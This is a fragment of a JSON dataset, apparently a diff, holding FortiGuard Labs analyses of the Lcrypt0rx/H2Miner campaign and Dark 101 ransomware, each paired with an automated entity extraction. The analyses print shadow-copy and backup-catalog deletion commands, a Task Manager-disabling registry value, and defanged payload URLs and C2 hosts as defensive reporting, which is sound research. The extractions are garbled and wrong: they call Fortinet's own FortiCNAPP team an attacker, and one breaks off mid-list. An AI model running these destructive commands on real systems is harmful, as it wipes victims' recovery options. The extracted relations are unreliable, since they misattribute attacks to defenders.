003C F2 0000 Disabled Disable F2 003D F3 0000 Disabled Disable F3 002E C 0000 Disabled Disable C 0032 M 0000 Disabled Disable M 0020 D 0000 Disabled Disable D 0014 T 0000 Disabled Disable T 001E A 0000 Disabled Disable A 001F S 0000 Disabled Disable S 0025 K 0000 Disabled Disable K 0031 N 0000 Disabled Disable N 0022 G 0000 Disabled Disable G 0012 E 0000 Disabled Disable E 0013 R 0000 Disabled Disable R 0017 I 0000 Disabled Disable I 0044 F10 0000 Disabled Disable F10 Next, the script marks itself asread-only,hidden, andsystem-protected, and proceeds to overwrite theMaster Boot Record (MBR)—a destructive move that renders the system unbootable. Lcrypt0rx then attempts to disable Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn't match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\Control Panel\\Desktop\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Full path Description C:\\Windows\\SysWOW64\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\Windows\\System32\\systemconfig.exe.vbs Denial-of-Service script that floods the system's network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs. C:\\Windows\\advapi32_ext.vbs Uses taskkill to kill targeted processes, including popular AV processes like Avast, Windows Defender, Kaspersky, AVG, Norton, Protegent360, AvGuard, McAfee McShield, etc., in an infinite loop. C:\\Windows\\System32\\USB_bridge.vbs Monitors for any newly connected drive and then copies itself over. Likely a prototype script. C:\\Windows\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\Windows\\System32\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine.This section is not seen in older Lcryx samples. The details about the executables are listed below. URL MD5 Description http://89[.]208[.]104[.]175:5002/ime3[.]exe 9e4f149dae1891f1d22a2cea4f68432e A Trojan with fake Google resources that is primarily used for disabling defences and Monero mining. It modifies the hosts file to block popular AV sites, adds defender whitelisting via PowerShell, removes the MSRT update via wusa.exe, disables Windows updates via sc.exe, creates a service persistence for itself, and escalates privileges via BYOVD technique for the vulnerable driver WinRing0.sys http://89[.]208[.]104[.]175:5002/piperpate[.]exe a729410de4dc397d1fb2ab8f7ae560d3 Lumma stealer. C2s: disciplipna[.]top/eqwu, praetori[.]live/vepr, opusculy[.]top/keaj, scriptao[.]digital/vpep, civitasu[.]run/werrp\", , exitiumt[.]digital/xane, viriatoe[.]live/laopx, brandihx[.]run/lowp, triremeo[.]digital/akds https://bitbucket[.]org/sadsafsadfsadf/dsfgdsgssdfgdsg/downloads/MicrosoftSoftware[.]exe 2726145d4ef3b34d3c3a566177805c39 Injector that checks for debugger and then injects DCRat. http://47[.]97[.]113[.]36:10010/02[.]08[.]2022[.]exe 1aee8a425ea53c571a16b8efde05ba01 Cobalt Strike C2 : 47[.]97[.]113[.]36 http://176[.]65[.]137[.]203/music-play[.]exe B6cd214bb814362694cc48299ebaf0e5 A Trojan that drops .bat files that execute xmrig miners from temp. The IP range also hosts a Metasploit reverse shell for Windows and Linux with C2 callbacks to 176[.]65[.]138[.]172 & softwareshop[.]win. The range also hosts web shells. http://185[.]156[.]72[.]121/test/exe/random[.]exe 0680df49e1866c86697028ea73d28d28 Amadey Infostealer. C2s: 185[.]156[.]72[.]96/te4h2nus/index.php mutex: 006700e5a2ab05704bbb0c589b88924d\" encryption_key: NGEyYjFkNzk0ZTc5YTQ1MzJiNmUyYjY3OTQwOGQyYmI= http://80[.]64[.]18[.]161/files/6051142952/8QivM1I[.]exe d3884cc519c6855ae20d64264d5f6e93 RustyStealer. It also executes multiple PowerShell commands that add folder exclusion for users\\<username> and appdata\\local\\packages to defender, creates runonce and scheduled task persistence for itself. These scripts have minor syntactical errors. http://78[.]153[.]140[.]66/xmrig[.]exe 57f0fdec4d919db0bd4576dc84aec752 Same Xmrig miner that was downloaded by H2miner script 1.ps1  6868c280c61c0b1e2ab8bf6792f1eef2 https://207[.]231[.]109[.]252/bin/support[.]client[.]exe 44143827116c96f5dcace4f95dff8697 ConnectWise ScreenConnect. The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services. FortiGuard Antivirus detects and blocks the components of this campaign with the following signatures: These signatures cover malicious VBScript loaders, PowerShell-based XMRig miners, shell scripts used by Kinsing, Trojans, and stealers, as well as payloads that attempt to overwrite the MBR or beacon to Cobalt Strike infrastructure. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus engine. Customers with up-to-date protections are already secured against these threats. Lacework FortiCNAPPhelps identify misconfigured cloud environments and runtime threats. It detects unauthorized mining activity, lateral movement, and the deployment of tools like XMRig or Kinsing in containerized or VM-based workloads. FortiCNAPP also correlates risk across posture, identity, and behavior to help prioritize critical vulnerabilities before they are exploited. TheFortiGuard Content Disarm and Reconstruction (CDR)service, available on FortiGate and FortiMail, can remove embedded threats from weaponized scripts and files—especially those delivered through phishing or lateral propagation. URLs used in this campaign, including malware delivery servers and C2 infrastructure, are rated as“Malicious Websites”by theFortiGuard Web Filtering service, preventing users from inadvertently accessing harmful payloads or ransom note URLs. FortiGuard IPSprovides network-level detection for indicators of malicious activity associated with both the H2Miner and Lcrypt0rx campaigns. Using deep-packet inspection and updated threat rules, it blocks: These protections cut off active infection vectors by identifying suspicious command-and-control behaviors and known malicious patterns. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceblocks known malicious source IPs involved in mining operations, C2 activity, and dropper infrastructure. This service aggregates data from Fortinet’s global threat intelligence network, including FortiSandbox, honeypots, CERTs, and trusted partners. To help strengthen organizational resilience, Fortinet offers freesecurity awareness trainingthrough theNSE Training Institute: If you believe your organization has been impacted by Lcrypt0rx, H2Miner, or any related threats, please contactthe FortiGuard Incident Response Team To stay informed of new and emerging threats, sign up forFortiGuard Threat Intelligence alerts 78[.]153[.]140[.]6680[.]64[.]16[.]24189[.]208[.]104[.]17547[.]97[.]113[.]36176[.]65[.]137[.]203185[.]156[.]72[.]9680[.]64[.]18[.]161207[.]231[.]109[.]252104[.]21[.]32[.]1 Files ff1706b37fea16d75b739a5396d9ffba9e4f149dae1891f1d22a2cea4f68432ea729410de4dc397d1fb2ab8f7ae560d32726145d4ef3b34d3c3a566177805c391aee8a425ea53c571a16b8efde05ba01B6cd214bb814362694cc48299ebaf0e50680df49e1866c86697028ea73d28d28d3884cc519c6855ae20d64264d5f6e9357f0fdec4d919db0bd4576dc84aec75244143827116c96f5dcace4f95dff8697 1bf1efeadedf52c0ed50941b10a2f468a7bee104bb486ad0f10331233cc9a9f10dc2c71ce9c6c34668e9636abf61b1ae01e5b2530d4cba34f91c8090d19c92db Kinsing dbc9125192bd1994cbb764f577ba5ddab3039abf2ad5202f4a9363b418002351da753ebcfe793614129fc11890acedbcccef46c7edf9131ccffc47bd69eb743b 06a482a6096e8ff4499ae69a9c150e92f5f2b61b39105a2b1e6e1a5f4a3863ae9f764ec91535eaf03983b930d9f3bacd Wallet 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC89UoMhtsrpaJTvmJBbvy1cTdg38pomPFnW5Z4sniL2izcLQyGBkEGd96TcBJtzQUi6KAL5Ehe4cFpEMNdGF7tFKpJ1DqE8X89Arz88KTafhoTPAseYf2bfcWSjNq1YLaVY7ZkFaU21FivDueX4d7X7UErnyjAWHsVB1mibdTGHzqUTsS5FCMog89GVcQCh FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
+    "extraction": {
+      "raw_output": "Named Entities: (FortiCNAPP team, Attacker), (H2miner, Threat Type), (Lcrypt0rx, Malware), (Linux, OS), (Windows, OS), (Containers, OS), (KinSing, Tool), (Xmrig miners, Tool), (Lcrypt0rx, Malware), (Lumma stealer, Tool), (DC Rat, Tool), (Cobalt Strike, Tool)\\nRelationships: (FortiCNAPP team, uses, H2miner), (FortiCNAPP team, uses, Lcrypt0rx), (H2miner, uses, KinSing), (H2miner, uses, Xmrig miners), (H2miner, uses, Lumma stealer), (H2miner, uses, DCRat), (H2miner, uses, Cobalt Strike), (Lcrypt0rx, contains, KinSing), (Lcrypt0rx, contains, Lumma stealer), (Lcrypt0rx, contains, DCRat), (Lcrypt0rx, contains, Cobalt Strike)",
+      "entities": [
+        [
+          "FortiCNAPP team",
+          "Attacker"
+        ],
+        [
+          "H2miner",
+          "Threat Type"
+        ],
+        [
+          "Lcrypt0rx",
+          "Malware"
+        ],
+        [
+          "Linux",
+          "OS"
+        ],
+        [
+          "Windows",
+          "OS"
+        ],
+        [
+          "Containers",
+          "OS"
+        ],
+        [
+          "KinSing",
+          "Tool"
+        ],
+        [
+          "Xmrig miners",
+          "Tool"
+        ],
+        [
+          "Lcrypt0rx",
+          "Malware"
+        ],
+        [
+          "Lumma stealer",
+          "Tool"
+        ],
+        [
+          "DC Rat",
+          "Tool"
+        ],
+        [
+          "Cobalt Strike",
+          "Tool"
+        ],
+        [
+          "FortiCNAPP team",
+          "uses",
+          "H2miner"
+        ],
+        [
+          "FortiCNAPP team",
+          "uses",
+          "Lcrypt0rx"
+        ],
+        [
+          "H2miner",
+          "uses",
+          "KinSing"
+        ],
+        [
+          "H2miner",
+          "uses",
+          "Xmrig miners"
+        ],
+        [
+          "H2miner",
+          "uses",
+          "Lumma stealer"
+        ],
+        [
+          "H2miner",
+          "uses",
+          "DCRat"
+        ],
+        [
+          "H2miner",
+          "uses",
+          "Cobalt Strike"
+        ],
+        [
+          "Lcrypt0rx",
+          "contains",
+          "KinSing"
+        ],
+        [
+          "Lcrypt0rx",
+          "contains",
+          "Lumma stealer"
+        ],
+        [
+          "Lcrypt0rx",
+          "contains",
+          "DCRat"
+        ],
+        [
+          "Lcrypt0rx",
+          "contains",
+          "Cobalt Strike"
+        ]
+      ],
+      "relationships": [],
+      "has_entities": true
+    },
+    "entity_count": 23,
+    "relationship_count": 0
+  },
+  {
+    "title": "How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques",
+    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques",
+    "content": "FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated .NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\Windows\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense. FortiSandbox effectively detects and documents malicious behavior, showcasing its critical role in protecting against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Kryptik.SAC!tr.ransom The FortiGuard AntiVirus engine is part of the FortiGate, FortiMail, FortiClient, and FortiEDR solutions. Customers who have these products with up-to-date protections are protected. FortiGuard Sandbox servicedetects the ransomware file as High Risk in the Ransomware category. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. ae3dd3d1eedb6835e6746d51d9ab21c6 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr = 1 Vssadmin delete shadows /all /quietWmic shadowcopy deleteWbadmin delete catalog –quiet %APPDATA%\\svchost.exeRead_it.txt FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
+    "extraction": {
+      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Dark 101, Malware Family), (ransomware, Threat Type), (ransomnote, Threat Type), (Bitcoin, Currency), (Task Manager, Tool), (backupcatalog, Object), (backupcopy, Object), (recoverymode, Object), (encryption, Technique), (ransompayment, Object), (FortiGuard Labs, Organization), (FortiSandbox, Tool), (Figure 1, Diagram), (Figure 2, Diagram)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (FortiGuard Labs, uses, FortiSandbox), (FortiGuard Labs, identifies, ransomware belonging to Dark 101 malware family), (FortiGuard Labs, documents, ransomware behavior), (FortiGuard Labs, provides, visual aids), (FortiGuard Labs, records, suspicious indicators), (FortiGuard Labs, publishes, Tree View diagram), (FortiGuard Labs, provides, visual representations), (FortiGuard Labs, analyzes, ransomware), (FortiGuard Labs, publishes, ransomware behavior), (FortiGuard Labs, provides, ransomware execution sequence), (FortiGuard Labs, provides, ransomware operational flow), (FortiGuard Labs, provides, ransomware execution logic), (FortiGuard Labs, provides, ransomware decryption process), (FortiGuard",
+      "entities": [
+        [
+          "FortiGuard Labs",
+          "Organization"
+        ],
+        [
+          "Dark 101",
+          "Malware Family"
+        ],
+        [
+          "ransomware",
+          "Threat Type"
+        ],
+        [
+          "ransomnote",
+          "Threat Type"
+        ],
+        [
+          "Bitcoin",
+          "Currency"
+        ],
+        [
+          "Task Manager",
+          "Tool"
+        ],
+        [
+          "backupcatalog",
+          "Object"
+        ],
+        [
+          "backupcopy",
+          "Object"
+        ],
+        [
+          "recoverymode",
+          "Object"
+        ],
+        [
+          "encryption",
+          "Technique"
+        ],
+        [
+          "ransompayment",
+          "Object"
+        ],
+        [
+          "FortiGuard Labs",
+          "Organization"
+        ],
+        [
+          "FortiSandbox",
+          "Tool"
+        ],
+        [
+          "Figure 1",
+          "Diagram"
+        ],
+        [
+          "Figure 2",
+          "Diagram"
+        ]
+      ],
+      "relationships": [
+        [
+          "FortiGuard Labs",
+          "publishes",
+          "2025 Global Threat Landscape Report"
+        ],
+        [
+          "FortiGuard Labs",
+          "uses",
+          "FortiSandbox"
+        ],
+        [
+          "FortiGuard Labs",
+          "identifies",
+          "ransomware belonging to Dark 101 malware family"
+        ],
+        [
+          "FortiGuard Labs",
+          "documents",
+          "ransomware behavior"
+        ],
+        [
+          "FortiGuard Labs",
+          "provides",
+          "visual aids"
+        ],
+        [
+          "FortiGuard Labs",
+          "records",
+          "suspicious indicators"
+        ],
+        [
+          "FortiGuard Labs",
+          "publishes",
+          "Tree View diagram"
+        ],
+        [
+          "FortiGuard Labs",
+          "provides",
+          "visual representations"
+        ],
+        [
+          "FortiGuard Labs",
+          "analyzes",
+          "ransomware"
+        ],
+        [
+          "FortiGuard Labs",
+          "publishes",
+          "ransomware behavior"
+        ],
+        [
+          "FortiGuard Labs",
+          "provides",
+          "ransomware execution sequence"
+        ],
+        [
+          "FortiGuard Labs",
+          "provides",
+          "ransomware operational flow"
+        ],
+        [
+          "FortiGuard Labs",
+          "provides",
+          "ransomware execution logic"
+        ],
+        [
+          "FortiGuard Labs",
+          "provides",
+          "ransomware decryption process"
+        ]
+      ],
+      "has_entities": true
+    },
+    "entity_count": 15,
+    "relationship_count": 14
+  }
+]
